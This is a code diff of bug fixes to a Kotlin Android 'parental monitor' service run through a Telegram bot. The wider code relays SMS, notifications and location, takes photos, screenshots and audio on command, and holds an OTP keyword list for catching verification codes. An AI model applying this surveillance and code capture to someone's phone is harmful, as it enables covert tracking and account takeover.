@@ -250,6 +250,7 @@ class MonitoringService : Service() {
         private const val HEX_DIGITS = "0123456789abcdef"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
+        private val WATCH_SPLIT_REGEX = "[,;\\s]+".toRegex()
         private val CURFEW_REGEX = Regex("^([01]\\d|2[0-3]):[0-5]\\d$")
         private val OTP_CODE_REGEX = Regex("\\b\\d{4,8}\\b")
         private val OTP_KEYWORDS = arrayOf("otp", "kode", "verifikasi", "verification", "otentikasi", "aktivasi", "konfirmasi", "token", "password", "kata sandi")
@@ -1227,8 +1228,7 @@ class MonitoringService : Service() {
         }
         if (response.code() == 401 || response.code() == 403) {
             try {
-                preferencesManager.credentialError = response.code().toString()
-                preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                preferencesManager.setCredentialError(response.code().toString(), System.currentTimeMillis())
             } catch (_: Exception) {
             }
             try {
@@ -1294,8 +1294,7 @@ class MonitoringService : Service() {
         if (!response.isSuccessful || response.body()?.ok != true) return false
         offsetFailCount = 0
         try {
-            preferencesManager.credentialError = ""
-            preferencesManager.credentialErrorAt = 0L
+            preferencesManager.setCredentialError("", 0L)
         } catch (_: Exception) {
         }
 
@@ -1472,7 +1471,8 @@ class MonitoringService : Service() {
 
     private fun postAuthFailureReminder(code: Int) {
         val now = android.os.SystemClock.elapsedRealtime()
-        if (now - authReminderAt.get() < 6 * 60 * 60_000L) return
+        val lastReminder = authReminderAt.get()
+        if (lastReminder != 0L && now - lastReminder < 6 * 60 * 60_000L) return
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                 androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED
@@ -2078,8 +2078,13 @@ class MonitoringService : Service() {
                 runFullRecovery()
             }
             "/layar" -> {
-                val hours = arg.trim().toIntOrNull()?.coerceIn(1, 24) ?: 24
-                sendToTelegram(screenTimeFull(hours))
+                val raw = arg.trim()
+                val parsed = raw.toIntOrNull()
+                if (raw.isNotEmpty() && (parsed == null || parsed !in 1..24)) {
+                    sendToTelegram("Cara pakai: /layar &lt;1-24&gt; (jam, bawaan 24)")
+                } else {
+                    sendToTelegram(screenTimeFull(parsed ?: 24))
+                }
             }
             "/kendara" -> handleKendaraCommand(arg)
             "/hematdata" -> handleHematDataCommand(arg)
@@ -2233,11 +2238,12 @@ class MonitoringService : Service() {
     }
 
     private suspend fun handleAppsCommand(arg: String) {
-        if (arg.isNotEmpty() && arg.toIntOrNull() == null) {
+        val parsed = arg.toIntOrNull()
+        if (arg.isNotEmpty() && parsed == null) {
             sendToTelegram("Cara pakai: /apps [5-50] (bawaan 30)")
             return
         }
-        val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
+        val limit = parsed?.coerceIn(5, 50) ?: 30
         val apps = listLaunchableApps(limit)
         if (apps.isEmpty()) {
             sendToTelegram("\uD83D\uDCE6 Tak ada aplikasi.")
@@ -2304,9 +2310,10 @@ class MonitoringService : Service() {
             preferencesManager.watchKeywords = ""
             sendToTelegram("👁️ Watch dimatikan.")
         } else {
-            val wordPool = sub.split(",", " ", ";").map { it.trim().lowercase(java.util.Locale.ROOT) }.filter { it.length >= 3 }.distinct()
+            val tokens = WATCH_SPLIT_REGEX.split(sub).map { it.trim() }.filter { it.isNotEmpty() }.distinct()
+            val wordPool = tokens.map { it.lowercase(java.util.Locale.ROOT) }.filter { it.length >= 3 }.distinct()
             val words = wordPool.take(10)
-            val dropped = sub.split(",", " ", ";").map { it.trim() }.filter { it.isNotEmpty() && it.length < 3 }.distinct()
+            val dropped = tokens.filter { it.length < 3 }
             if (words.isEmpty()) {
                 sendToTelegram("Cara pakai: /watch &lt;kata1,kata2&gt; (min 3 huruf, maks 10) atau /watch off")
             } else {
@@ -2333,12 +2340,13 @@ class MonitoringService : Service() {
             if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
             sendToTelegram("📍 $name: " + fenceStatusText(command == "/home"))
         } else {
-            val nums = sub.replace(",", " ").split(CMD_SPLIT_REGEX).mapNotNull { it.toDoubleOrNull() }
-            if (nums.size < 2) {
+            val tokens = sub.replace(",", " ").split(CMD_SPLIT_REGEX).filter { it.isNotEmpty() }
+            val nums = tokens.map { it.toDoubleOrNull() }
+            if (nums.size !in 2..3 || nums.any { it == null }) {
                 sendToTelegram("Cara pakai: $command &lt;lat,lon,radius&gt; (radius 50-5000 m, default 200)")
             } else {
-                val lat = nums[0]
-                val lon = nums[1]
+                val lat = nums[0]!!
+                val lon = nums[1]!!
                 val rad = nums.getOrNull(2)?.toInt() ?: 200
                 if (lat !in -90.0..90.0 || lon !in -180.0..180.0 || rad !in 50..5000) {
                     sendToTelegram("Koordinat/radius tak valid (lat -90..90, lon -180..180, radius 50-5000).")
@@ -2538,7 +2546,7 @@ class MonitoringService : Service() {
         val stagedBy = pending?.owner ?: ""
         val nowConfirm = System.currentTimeMillis()
         if (number.isEmpty() || smsText.isEmpty() || stagedAt <= 0L || stagedAt > nowConfirm || nowConfirm - stagedAt > 300_000L) {
-            if (stagedAt <= 0L || (stagedAt <= nowConfirm && nowConfirm - stagedAt > 300_000L)) preferencesManager.clearSmsPendingIf(stagedAt)
+            preferencesManager.clearSmsPendingIf(stagedAt)
             sendToTelegram("⏱️ Tak ada SMS tertunda. Kirim /sms &lt;nomor&gt; &lt;pesan&gt; dulu.")
         } else if (stagedBy.isNotEmpty() && stagedBy != senderId) {
             sendToTelegram("⛔ Hanya peminta yang bisa mengonfirmasi SMS ini.")
@@ -2710,7 +2718,7 @@ class MonitoringService : Service() {
 
     private suspend fun handleNotifCommand(arg: String) {
         when (arg.lowercase(java.util.Locale.ROOT)) {
-            "on" -> {
+            "on", "nyala" -> {
                 preferencesManager.notifForwardEnabled = true
                 if (isNotifForwarding()) {
                     sendToTelegram("\uD83D\uDD14 Penerusan notifikasi NYALA.")
@@ -2718,7 +2726,7 @@ class MonitoringService : Service() {
                     sendToTelegram("Penerusan notifikasi nyala, tapi akses notifikasi sistem belum ada. Buka Setup, tekan Read Notifications untuk mengizinkan.")
                 }
             }
-            "off" -> {
+            "off", "mati" -> {
                 preferencesManager.notifForwardEnabled = false
                 sendToTelegram("\uD83D\uDD15 Penerusan notifikasi MATI.")
             }
@@ -2916,6 +2924,10 @@ class MonitoringService : Service() {
 
 
     private suspend fun handlePhotoCommand(arg: String) {
+        if (preferencesManager.monitoringPaused) {
+            sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
+            return
+        }
         val lens = arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)
         if (lens.isNotEmpty()) {
             when (lens) {
@@ -2927,12 +2939,8 @@ class MonitoringService : Service() {
                 }
             }
         }
-        if (preferencesManager.monitoringPaused) {
-            sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
-        } else {
-            sendToTelegram("📸 Ambil foto sekarang…")
-            captureAndSendPhoto(reportResult = true)
-        }
+        sendToTelegram("📸 Ambil foto sekarang…")
+        captureAndSendPhoto(reportResult = true)
     }
 
     private suspend fun handleStatusCommand() {
@@ -3033,11 +3041,11 @@ class MonitoringService : Service() {
 
     private suspend fun handlePatrolCommand(arg: String) {
         when (arg.lowercase(java.util.Locale.ROOT)) {
-            "on" -> {
+            "on", "nyala" -> {
                 preferencesManager.patrolEnabled = true
                 sendToTelegram("\uD83D\uDEF0 Patroli NYALA \u2014 foto + lokasi tiap ${preferencesManager.patrolInterval} mnt.")
             }
-            "off" -> {
+            "off", "mati" -> {
                 preferencesManager.patrolEnabled = false
                 sendToTelegram("\uD83D\uDEF0 Patroli MATI.")
             }
@@ -3050,13 +3058,13 @@ class MonitoringService : Service() {
 
     private suspend fun handleNightCommand(arg: String) {
         when (arg.lowercase(java.util.Locale.ROOT)) {
-            "on" -> {
+            "on", "nyala" -> {
                 preferencesManager.nightMode = true
                 try { restartCameraLoop() } catch (_: Exception) { }
                 try { restartPatrolLoop() } catch (_: Exception) { }
                 sendToTelegram("🌙 Mode malam NYALA — foto/lokasi otomatis dijeda 23:00–05:00.")
             }
-            "off" -> {
+            "off", "mati" -> {
                 preferencesManager.nightMode = false
                 try { restartCameraLoop() } catch (_: Exception) { }
                 try { restartPatrolLoop() } catch (_: Exception) { }
@@ -3680,7 +3688,7 @@ class MonitoringService : Service() {
                         try { if (!confirmedParts.add(part)) return } catch (_: Exception) { return }
                     } else if (okCount.get() + failCount.get() >= expected) return
                     if (resultCode == android.app.Activity.RESULT_OK) {
-                        if (okCount.incrementAndGet() >= expected && failCount.get() == 0) delivered.complete(true)
+                        if (okCount.incrementAndGet() + failCount.get() >= expected) delivered.complete(failCount.get() == 0)
                     } else {
                         if (failCount.incrementAndGet() + okCount.get() >= expected) delivered.complete(false)
                     }
@@ -4100,8 +4108,7 @@ class MonitoringService : Service() {
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
                 try {
-                    preferencesManager.credentialError = ""
-                    preferencesManager.credentialErrorAt = 0L
+                    preferencesManager.setCredentialError("", 0L)
                 } catch (_: Exception) {
                 }
                 noteSendOk()
@@ -4115,8 +4122,7 @@ class MonitoringService : Service() {
             } else if (response.code() == 401 || response.code() == 403) {
                 android.util.Log.e("MonitoringService", "Send rejected (${response.code()}), queuing")
                 try {
-                    preferencesManager.credentialError = response.code().toString()
-                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                    preferencesManager.setCredentialError(response.code().toString(), System.currentTimeMillis())
                 } catch (_: Exception) {
                 }
                 queueForRetry(message, queueOnFail)
@@ -4152,8 +4158,7 @@ class MonitoringService : Service() {
         }
         if (NetworkUtils.isChatMissing(goneBody)) {
             try {
-                preferencesManager.credentialError = code.toString()
-                preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                preferencesManager.setCredentialError(code.toString(), System.currentTimeMillis())
             } catch (_: Exception) {
             }
             try {
@@ -4197,8 +4202,7 @@ class MonitoringService : Service() {
         val fallbackResp = TelegramClient.api.sendMessage(fallbackUrl, TelegramMessage(chatId = chatId, text = plain, parseMode = null))
         if (fallbackResp.isSuccessful && fallbackResp.body()?.ok == true) {
             try {
-                preferencesManager.credentialError = ""
-                preferencesManager.credentialErrorAt = 0L
+                preferencesManager.setCredentialError("", 0L)
             } catch (_: Exception) {
             }
             noteSendOk()
@@ -4210,8 +4214,7 @@ class MonitoringService : Service() {
             return false
         } else if (fallbackResp.code() == 401 || fallbackResp.code() == 403) {
             try {
-                preferencesManager.credentialError = fallbackResp.code().toString()
-                preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                preferencesManager.setCredentialError(fallbackResp.code().toString(), System.currentTimeMillis())
             } catch (_: Exception) {
             }
             queueForRetry(plain, queueOnFail)
@@ -4227,8 +4230,7 @@ class MonitoringService : Service() {
             }
             if (NetworkUtils.isChatMissing(fbBody)) {
                 try {
-                    preferencesManager.credentialError = fallbackResp.code().toString()
-                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                    preferencesManager.setCredentialError(fallbackResp.code().toString(), System.currentTimeMillis())
                 } catch (_: Exception) {
                 }
                 queueForRetry(plain, queueOnFail)
@@ -4430,7 +4432,7 @@ class MonitoringService : Service() {
         if (!hardwareSpeed && vehicleFastSamples < 2) return
         vehicleFastSamples = 0
         val last = try { preferencesManager.lastVehicleAlertAt } catch (_: Exception) { 0L }
-        if (now - last < VEHICLE_COOLDOWN_MS) return
+        if (last > 0L && now > last && now - last < VEHICLE_COOLDOWN_MS) return
         try { preferencesManager.lastVehicleAlertAt = now } catch (_: Exception) { }
         val kmh = (speed * 3.6f).toInt()
         val level = batteryLevel()
@@ -4460,12 +4462,7 @@ class MonitoringService : Service() {
 
     private fun isMediaActive(file: File?): Boolean {
         if (file == null) return false
-        if (activeMediaFiles.contains(file)) return true
-        return try {
-            file == cameraService.currentVideoFile()
-        } catch (_: Exception) {
-            false
-        }
+        return activeMediaFiles.contains(file)
     }
 
     private fun pendingMediaCount(): Int {
@@ -4504,7 +4501,7 @@ class MonitoringService : Service() {
         try {
             val now = System.currentTimeMillis()
             val last = preferencesManager.dataSaverNoticeAt
-            if (last == 0L || now - last >= 6 * 60 * 60_000L) {
+            if (last <= 0L || now <= last || now - last >= 6 * 60 * 60_000L) {
                 preferencesManager.dataSaverNoticeAt = now
                 sendToTelegram("📶 <b>Hemat kuota</b>: $pending foto/video/rekaman ditahan dulu, dikirim otomatis begitu tersambung Wi-Fi.")
             }
@@ -4736,17 +4733,11 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun todayKey(): String {
-        return try {
-            val sdf = java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.ROOT)
-            sdf.timeZone = java.util.TimeZone.getDefault()
-            sdf.format(java.util.Date(System.currentTimeMillis()))
-        } catch (_: Exception) {
-            ""
-        }
+    private fun todayKey(ts: Long = System.currentTimeMillis()): String {
+        return com.redeye.parentalmonitor.utils.TimeFmt.dayKey(ts)
     }
 
-    private suspend fun sendDailyDigest(manual: Boolean = false) {
+    private suspend fun sendDailyDigest(manual: Boolean = false): Boolean {
         try {
             val now = System.currentTimeMillis()
             val since = now - 24 * 60 * 60_000L
@@ -4789,7 +4780,9 @@ class MonitoringService : Service() {
             },
                 mainMenu()
             )
+            return true
         } catch (_: Exception) {
+            return false
         }
     }
 
@@ -4803,8 +4796,9 @@ class MonitoringService : Service() {
             if (key.isEmpty()) return
             val done = try { preferencesManager.nightDigestDate } catch (_: Exception) { "" }
             if (done == key) return
-            try { preferencesManager.nightDigestDate = key } catch (_: Exception) { }
-            sendDailyDigest(manual = false)
+            if (sendDailyDigest(manual = false)) {
+                try { preferencesManager.nightDigestDate = key } catch (_: Exception) { }
+            }
         } catch (_: Exception) {
         }
     }
@@ -5037,8 +5031,8 @@ class MonitoringService : Service() {
                 try { preferencesManager.begadangDate = key } catch (_: Exception) { }
                 return
             }
-            try { preferencesManager.begadangDate = key } catch (_: Exception) { }
             sendToTelegram("🌙 Begadang: $nights aktivitas 23–05 semalam. Cek /minggu untuk pola.")
+            try { preferencesManager.begadangDate = key } catch (_: Exception) { }
         } catch (_: Exception) {
         }
     }
@@ -5093,7 +5087,7 @@ class MonitoringService : Service() {
                 appendLine("📊 <b>Laporan 7 hari</b>")
                 appendLine("SMS: ${if (sms.size >= 200) "200+" else "${sms.size}"}, Panggilan: ${if (calls.size >= 200) "200+" else "${calls.size}"}")
                 if (top.isEmpty()) appendLine("Kontak teratas: -") else appendLine("Teratas: " + top.joinToString(", ") { it.key + " (${it.value}x)" })
-                if (busy in 0..23) appendLine("Jam tersibuk: ${busy}:00 (${hours[busy]} aktivitas)")
+                if (busy >= 0 && hours[busy] > 0) appendLine("Jam tersibuk: ${busy}:00 (${hours[busy]} aktivitas)")
                 appendLine("Aktif 00–23: " + sparkline(hours))
                 appendLine("Begadang (23–05): $nights")
                 if (watch.isNotEmpty() || watchNums.isNotEmpty()) appendLine("Kena pantau: $watchHits")
@@ -5108,8 +5102,6 @@ class MonitoringService : Service() {
     private suspend fun checkCurfew() {
         try {
             val now = System.currentTimeMillis()
-            val key = todayKey()
-            if (key.isEmpty()) return
             val cal = java.util.Calendar.getInstance()
             val h = cal.get(java.util.Calendar.HOUR_OF_DAY)
             val day = cal.get(java.util.Calendar.DAY_OF_WEEK)
@@ -5124,6 +5116,8 @@ class MonitoringService : Service() {
             }
             val inSchool = day != java.util.Calendar.SATURDAY && day != java.util.Calendar.SUNDAY && h in 8..15
             if (!inCurfew && !inSchool) return
+            val key = todayKey(if (h < 5) now - 24 * 60 * 60_000L else now)
+            if (key.isEmpty()) return
             var pos = lastSentLatLon()
             val locAge = now - try { preferencesManager.lastLocAt } catch (_: Exception) { 0L }
             if (pos == null || locAge > 30 * 60_000L) {
@@ -5786,7 +5780,7 @@ class MonitoringService : Service() {
         serviceScope.launch {
             if (reportResult) {
                 val hint = if (policyBlocked) policyFailureHint(cameraBlockingAdmins()) else cameraFailureHint(exception.message)
-                sendToTelegram("⚠️ Gagal memotret: " + sanitizedCameraError(exception.message) + " " + hint)
+                sendToTelegram("⚠️ Gagal memotret: " + Html.escape(sanitizedCameraError(exception.message)) + " " + hint)
             } else {
                 notifyCameraFailure(sanitizedCameraError(exception.message))
             }
@@ -6045,7 +6039,12 @@ class MonitoringService : Service() {
             if (projection != null) projection.unregisterCallback(shotStopCallback)
         } catch (_: Exception) {
         }
-        com.redeye.parentalmonitor.utils.ScreenCapture.revoke()
+        val pending = try { com.redeye.parentalmonitor.utils.ScreenCapture.request() } catch (_: Exception) { null }
+        if (pending != null) {
+            try { com.redeye.parentalmonitor.utils.ScreenCapture.dropProjection() } catch (_: Exception) { }
+        } else {
+            com.redeye.parentalmonitor.utils.ScreenCapture.revoke()
+        }
     }
 
     private fun resolveShotProjection(): MediaProjection? {
@@ -6196,8 +6195,12 @@ class MonitoringService : Service() {
             result.complete(null)
         }
         val bmp = try {
-            kotlinx.coroutines.withTimeoutOrNull(20_000L) { result.await() }
+            kotlinx.coroutines.withTimeout(20_000L) { result.await() }
+        } catch (e: kotlinx.coroutines.TimeoutCancellationException) {
+            result.cancel()
+            return null
         } catch (e: kotlinx.coroutines.CancellationException) {
+            result.cancel()
             throw e
         } catch (_: Exception) {
             null
@@ -6351,7 +6354,7 @@ class MonitoringService : Service() {
             if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastCameraErrorNotice = now
             val hint = if (policyError) policyFailureHint(cameraBlockingAdmins()) else cameraFailureHint(clean)
-            sendToTelegram("⚠️ Gagal memotret: $clean. $hint")
+            sendToTelegram("⚠️ Gagal memotret: " + Html.escape(clean) + ". $hint")
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error sending camera notice: ${redactToken(e.message)}")
         }
@@ -6363,7 +6366,7 @@ class MonitoringService : Service() {
             val last = preferencesManager.lastUploadErrorNotice
             if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastUploadErrorNotice = now
-            sendToTelegram("⚠️ Unggah $jenis gagal ($detail). Akan dicoba otomatis.")
+            sendToTelegram("⚠️ Unggah $jenis gagal (" + Html.escape(detail) + "). Akan dicoba otomatis.")
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error sending upload notice: ${redactToken(e.message)}")
         }
@@ -6392,8 +6395,7 @@ class MonitoringService : Service() {
         if (code == 401 || code == 403) {
             android.util.Log.e("MonitoringService", "$label auth rejected ($code), keeping file for retry")
             try {
-                preferencesManager.credentialError = code.toString()
-                preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                preferencesManager.setCredentialError(code.toString(), System.currentTimeMillis())
             } catch (_: Exception) {
             }
             return MediaSendOutcome.KEPT
@@ -6402,8 +6404,7 @@ class MonitoringService : Service() {
             if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
             if (NetworkUtils.isChatMissing(errorFull)) {
                 try {
-                    preferencesManager.credentialError = code.toString()
-                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                    preferencesManager.setCredentialError(code.toString(), System.currentTimeMillis())
                 } catch (_: Exception) {
                 }
                 return MediaSendOutcome.KEPT
@@ -6740,7 +6741,7 @@ class MonitoringService : Service() {
     private fun pendingVideoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4") && !isMediaActive(file)
+                file.isFile && file.length() > 0L && file.name.startsWith("video_") && file.name.endsWith(".mp4") && !isMediaActive(file)
             }?.size ?: 0
         } catch (_: Exception) {
             0
@@ -6750,7 +6751,17 @@ class MonitoringService : Service() {
     private fun pendingPhotoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && !isMediaActive(file)
+                file.isFile && file.length() > 0L && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && !isMediaActive(file)
+            }?.size ?: 0
+        } catch (_: Exception) {
+            0
+        }
+    }
+
+    private fun pendingAudioCount(): Int {
+        return try {
+            cacheDir.listFiles { file ->
+                file.isFile && file.length() > 0L && file.name.startsWith("audio_") && file.name.endsWith(".m4a") && !isMediaActive(file)
             }?.size ?: 0
         } catch (_: Exception) {
             0
@@ -6817,7 +6828,7 @@ class MonitoringService : Service() {
                         if (initialStuck) initialSyncRunning.set(false)
                         restartAllLoops(fromWatchdog = true)
                         val now = android.os.SystemClock.elapsedRealtime()
-                        if (now - loopWatchdogNoticeAt > 3_600_000L) {
+                        if (loopWatchdogNoticeAt == 0L || now - loopWatchdogNoticeAt > 3_600_000L) {
                             loopWatchdogNoticeAt = now
                             replyLater("\u267B\uFE0F Watchdog restarted dead loops.")
                         }
@@ -6997,13 +7008,13 @@ class MonitoringService : Service() {
             sendToTelegram("Dibatasi Telegram (rate limit) — rekaman ditahan lalu dicoba lagi.")
             return
         }
-        val pendingAudio = try { cacheDir.listFiles { f -> f.isFile && f.name.startsWith("audio_") && f.name.endsWith(".m4a") }?.size ?: 0 } catch (_: Exception) { 0 }
+        val pendingAudio = pendingAudioCount()
         if (pendingAudio >= MAX_AUDIO_KEPT) {
             try {
                 pruneAudioCache(MAX_AUDIO_KEPT - 1)
             } catch (_: Exception) {
             }
-            val pendingAudioNow = try { cacheDir.listFiles { f -> f.isFile && f.name.startsWith("audio_") && f.name.endsWith(".m4a") }?.size ?: 0 } catch (_: Exception) { 0 }
+            val pendingAudioNow = pendingAudioCount()
             if (pendingAudioNow >= MAX_AUDIO_KEPT) {
                 sendToTelegram("Antrean rekaman penuh (offline). Yang paling lama yang belum terkirim dibuang; rekaman baru dilewati.")
                 return
@@ -7205,7 +7216,11 @@ class MonitoringService : Service() {
             if (pendingVideoCount() >= MAX_VIDEO_KEPT) {
                 recordBusy.set(false)
                 serviceScope.launch {
-                    sendToTelegram("⚠️ Antrean video penuh (offline). Yang paling lama yang belum terkirim dibuang; video baru dilewati.")
+                    if (videoFlushBusy.get()) {
+                        sendToTelegram("⏳ Sedang mengirim video tertunda, coba lagi sebentar.")
+                    } else {
+                        sendToTelegram("⚠️ Antrean video penuh (offline). Yang paling lama yang belum terkirim dibuang; video baru dilewati.")
+                    }
                 }
                 return
             }
@@ -7394,6 +7409,12 @@ class MonitoringService : Service() {
     private fun pruneVideoCache(maxKept: Int) {
         if (videoFlushBusy.get()) return
         try {
+            try {
+                cacheDir.listFiles { file ->
+                    file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4.tmp") && System.currentTimeMillis() - file.lastModified() > 3_600_000L
+                }?.forEach { deleteQuietly(it) }
+            } catch (_: Exception) {
+            }
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
             }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
